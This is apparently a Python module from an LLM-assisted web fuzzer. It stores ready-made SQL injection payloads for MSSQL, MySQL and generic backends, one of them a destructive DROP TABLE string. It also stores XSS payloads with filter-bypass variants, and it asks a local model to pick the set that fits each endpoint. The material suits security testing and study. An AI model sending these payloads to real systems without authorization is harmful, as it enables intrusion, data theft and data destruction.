# =============================================================================
# fuzzer/payload_planner.py
#
# Cách tiếp cận:
#   - Không dùng RAG (không cần vector DB, không cần embedding)
#   - Dùng PAYLOAD DATABASE phân loại sẵn theo technique + backend
#   - AI chỉ làm 1 việc: đọc response mẫu → đoán backend → chọn payload set
#
# Lý do bỏ RAG:
#   - 1-2 tài liệu nhúng vào prompt = context stuffing, không phải RAG thật
#   - Model 14B đã có sẵn kiến thức SQLi/XSS, không cần feed thêm
#   - Payload DB cứng + AI chọn đúng set = kết quả tốt hơn, ổn định hơn
# =============================================================================

import json
import logging

from llm.ollama_client import call_json

log = logging.getLogger(__name__)


# =============================================================================
# PAYLOAD DATABASE — phân loại theo technique + backend
# Đây là nguồn payload chính, không phụ thuộc AI
# =============================================================================

SQLI_PAYLOADS = {

    # ── Error-based ────────────────────────────────────────────────────────
    "error_mssql": [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "'; SELECT @@version--",
        "1' AND 1=CONVERT(int,@@version)--",
        "' UNION SELECT NULL,@@version--",
        "' OR 1=1--",
        "admin'--",
        "' OR ''='",
    ],
    "error_mysql": [
        "' OR '1'='1",
        "' OR '1'='1'#",
        "' AND SLEEP(0)#",
        "' UNION SELECT NULL,version()#",
        "1' AND extractvalue(1,concat(0x7e,version()))#",
        "' OR 1=1#",
    ],
    "error_generic": [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "1 OR 1=1",
        "' OR 'x'='x",
    ],

    # ── Time-based ─────────────────────────────────────────────────────────
    "time_mssql": [
        "'; WAITFOR DELAY '0:0:4'--",
        "1; WAITFOR DELAY '0:0:4'--",
        "' IF(1=1) WAITFOR DELAY '0:0:4'--",
    ],
    "time_mysql": [
        "' AND SLEEP(4)--",
        "1' AND SLEEP(4)#",
        "' OR SLEEP(4)#",
        "1 AND SLEEP(4)",
    ],
    "time_generic": [
        "'; WAITFOR DELAY '0:0:4'--",
        "' AND SLEEP(4)--",
        "1; SELECT pg_sleep(4)--",
    ],

    # ── Boolean-based ──────────────────────────────────────────────────────
    "boolean": [
        ("' AND 1=1--",  "' AND 1=2--"),
        ("' OR 1=1--",   "' OR 1=2--"),
        ("1 AND 1=1",    "1 AND 1=2"),
        ("' AND 'a'='a", "' AND 'a'='b"),
    ],

    # ── Union-based (cần biết số cột) ─────────────────────────────────────
    "union": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT @@version,NULL--",
        "' UNION SELECT NULL,@@version--",
    ],
}

XSS_PAYLOADS = {

    # ── HTML body context ──────────────────────────────────────────────────
    "html_body": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],

    # ── HTML attribute context ─────────────────────────────────────────────
    "html_attribute": [
        '"><script>alert(1)</script>',
        '" onmouseover="alert(1)" x="',
        "' onmouseover='alert(1)' x='",
        '"><img src=x onerror=alert(1)>',
        '" autofocus onfocus="alert(1)',
    ],

    # ── JavaScript context ─────────────────────────────────────────────────
    "js_context": [
        "';alert(1)//",
        '";alert(1)//',
        "</script><script>alert(1)</script>",
        "\\';alert(1)//",
    ],

    # ── Filter bypass ──────────────────────────────────────────────────────
    "bypass": [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<script >alert(1)</script >",
        "<scr\x00ipt>alert(1)</scr\x00ipt>",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "<svg/onload=alert(1)>",
        "<img src=1 onerror=alert(1)>",
    ],
}


# =============================================================================
# ENTRY POINT
# =============================================================================

def generate_plan(endpoints: list) -> dict:
    """
    Sinh payload plan cho từng endpoint.

    Flow:
      1. Với mỗi endpoint high/medium:
         - Lấy response mẫu từ response_sample
         - Gọi AI đoán backend (MSSQL/MySQL/generic)
         - Chọn payload set phù hợp từ PAYLOAD DATABASE
      2. Trả về {ep_id: {"sqli": [...], "xss": [...]}}
    """
    targets = [ep for ep in endpoints if ep.risk_level in ("high", "medium")]
    if not targets:
        log.warning("[planner] Không có endpoint cần plan")
        return {}

    plan = {}
    for ep in targets:
        ep_plan = {}

        if "sqli" in ep.likely_vulns:
            ep_plan["sqli"] = _select_sqli_payloads(ep)

        if "xss" in ep.likely_vulns:
            ep_plan["xss"] = _select_xss_payloads(ep)

        if ep_plan:
            plan[ep.id] = ep_plan
            log.info(f"[planner] {ep.id}: "
                     f"sqli={len(ep_plan.get('sqli',[]))} "
                     f"xss={len(ep_plan.get('xss',[]))}")

    return plan


# =============================================================================
# SQLi — AI đoán backend → chọn payload set
# =============================================================================

def _select_sqli_payloads(ep) -> dict:
    """
    AI đọc URL + response_sample → đoán backend → trả về payload set đúng.
    Fallback: generic nếu AI không đoán được.

    Returns:
        {
          "error":   [payload, ...],
          "time":    [payload, ...],
          "boolean": [(true, false), ...],
          "union":   [payload, ...]
        }
    """
    backend = _ai_detect_backend(ep)
    log.info(f"[planner] {ep.id} → backend={backend}")

    return {
        "error":   SQLI_PAYLOADS.get(f"error_{backend}",   SQLI_PAYLOADS["error_generic"]),
        "time":    SQLI_PAYLOADS.get(f"time_{backend}",    SQLI_PAYLOADS["time_generic"]),
        "boolean": SQLI_PAYLOADS["boolean"],
        "union":   SQLI_PAYLOADS["union"],
    }


def _ai_detect_backend(ep) -> str:
    """
    Gọi AI để đoán backend database.
    Fallback tự động nếu Ollama không khả dụng.
    """
    # Fallback nhanh từ URL extension — không cần AI
    url_lower = ep.url.lower()
    if any(ext in url_lower for ext in [".asp", ".aspx"]):
        log.debug(f"[planner] backend=mssql (URL extension)")
        return "mssql"
    if any(ext in url_lower for ext in [".php", ".php3"]):
        log.debug(f"[planner] backend=mysql (URL extension)")
        return "mysql"

    # Thử hỏi AI nếu không đoán được từ URL
    try:
        prompt = f"""Bạn là chuyên gia pentest. Đoán database backend của endpoint này:

URL: {ep.url}
Response sample: {json.dumps(ep.response_sample)}
Server header (nếu có): {ep.response_sample.get('server', '')}

Đặc điểm nhận biết:
- MSSQL: URL .asp/.aspx, server=IIS/Microsoft
- MySQL:  URL .php, server=Apache/nginx
- Generic: không rõ

Trả về JSON: {{"backend": "mssql|mysql|generic"}}"""

        result = call_json(prompt)
        if isinstance(result, dict) and result.get("backend") in ("mssql", "mysql", "generic"):
            return result["backend"]
    except Exception as e:
        log.debug(f"[planner] AI detect backend lỗi: {e}")

    log.debug("[planner] Không đoán được backend → dùng generic")
    return "generic"


# =============================================================================
# XSS — AI đoán context → chọn payload set
# =============================================================================

def _select_xss_payloads(ep) -> list:
    """
    AI đọc response snippet → đoán context (html_body/attribute/js) → chọn payload.
    Luôn thêm bypass payloads vào cuối.

    Returns:
        [payload_str, ...]  — flat list
    """
    context = _ai_detect_xss_context(ep)
    log.info(f"[planner] {ep.id} → xss_context={context}")

    base    = XSS_PAYLOADS.get(context, XSS_PAYLOADS["html_body"])
    bypass  = XSS_PAYLOADS["bypass"]

    # Bỏ trùng, giữ thứ tự
    seen = set()
    result = []
    for p in base + bypass:
        if p not in seen:
            seen.add(p)
            result.append(p)
    return result


def _ai_detect_xss_context(ep) -> str:
    """
    Gọi AI đoán context XSS dựa trên response snippet.
    Trả về: "html_body" | "html_attribute" | "js_context"
    """
    snippet = ep.response_sample.get("body_snippet", "")[:300]
    if not snippet:
        return "html_body"

    prompt = f"""Bạn là chuyên gia pentest XSS. Đoán context reflection của param trong response sau:

Response snippet (đoạn xung quanh chỗ param được reflect):
{snippet}

Context options:
- html_body:      param xuất hiện trực tiếp trong HTML, không trong tag hay JS
- html_attribute: param xuất hiện trong giá trị attribute (<input value="PARAM">)
- js_context:     param xuất hiện trong block JavaScript (var x = "PARAM")

Trả về JSON:
{{"context": "html_body|html_attribute|js_context", "reason": "..."}}"""

    result = call_json(prompt)

    if isinstance(result, dict) and result.get("context") in ("html_body", "html_attribute", "js_context"):
        return result["context"]

    return "html_body"  # fallback an toàn nhất